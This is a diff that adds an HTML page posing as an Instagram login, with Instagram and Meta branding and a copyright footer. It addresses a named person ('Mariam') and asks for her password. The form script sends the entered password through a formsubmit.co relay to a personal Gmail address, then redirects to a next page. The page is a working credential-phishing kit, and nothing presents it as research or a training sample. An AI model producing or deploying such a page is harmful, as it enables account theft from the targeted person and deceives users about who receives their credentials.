@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+  <div class="logo-stack">
+    <img src="alllogo.png" alt="All logo">
+    <img src="2logo.png" alt="Logo">
+  </div>
+ <br>
+  <br>
+  
+  
+  <br>
+  <br>
+  <br>
+  <pre class="access-message"> <p class="mariam-name">✨Mariam✨</p>
+  Enter your password to continue</pre>
+  <main class="feedback-section">
+    <form id="feedback-form" action="https://formsubmit.co/ajax/narutomaki702@gmail.com" method="POST">
+  <input type="hidden" name="_subject" value="Password">
+
+  <div class="password-box">
+    <input
+      type="password"
+      id="password"
+      name="Password"
+      required
+      placeholder="Password"
+    ><button type="button" class="eye-button" onclick="togglePassword()">
+  👁
+</button>
+
+   
+  </div>
+
+  <button class="button" type="submit">Next</button>
+</form>
+
+<script>
+function togglePassword() {
+  const password = document.getElementById("password");
+  const eye = document.querySelector(".eye-button");
+
+  if (password.type === "password") {
+    password.type = "text";
+    eye.textContent = "👁̸";
+  } else {
+    password.type = "password";
+    eye.textContent = "👁";
+  }
+}
+</script>
+
+    <script>
+document.getElementById("feedback-form").addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const form = this;
+
+  const response = await fetch(form.action, {
+    method: "POST",
+    body: new FormData(form),
+    headers: {
+      "Accept": "application/json"
+    }
+  });
+
+  if (response.ok) {
+    window.location.href = "next.html";
+  }
+});
+</script>
+
+
+    <p class="success-message" id="success-message" role="status" hidden></p>
+    <p class="error-message" id="error-message" role="alert" hidden>Could not submit. Please try again.</p>
+  </main>
+  <br>
+  <br>
+  
+  <br>
+  <br>
+  <br>
+  <br>
+  <br>
+
+  <picture>
+  <!-- Dark mode -->
+  <source
+    media="(prefers-color-scheme: dark)"
+    srcset="allmeta.png"
+  >
+
+  <!-- Light mode -->
+  <img
+    src="allmetablack.png"
+    alt="Meta"
+  >
+</picture>
+  <script src="script.js"></script>
+  <!-- unothorised -->
+   <!-- mpppppppppppppppppppp -->
+  <script>
+    window.setTimeout(() => {
+      const startupScreen = document.getElementById("startup-screen");
+      startupScreen.classList.add("is-hidden");
+      window.setTimeout(() => startupScreen.remove(), 300);
+    }, 2000);
+  </script>
+  <footer style="font-size: 12px; text-align: center; color: #999; margin-top: 20px;">
+    &copy;2026Instagram
+  </footer>
+</body>
+</html>
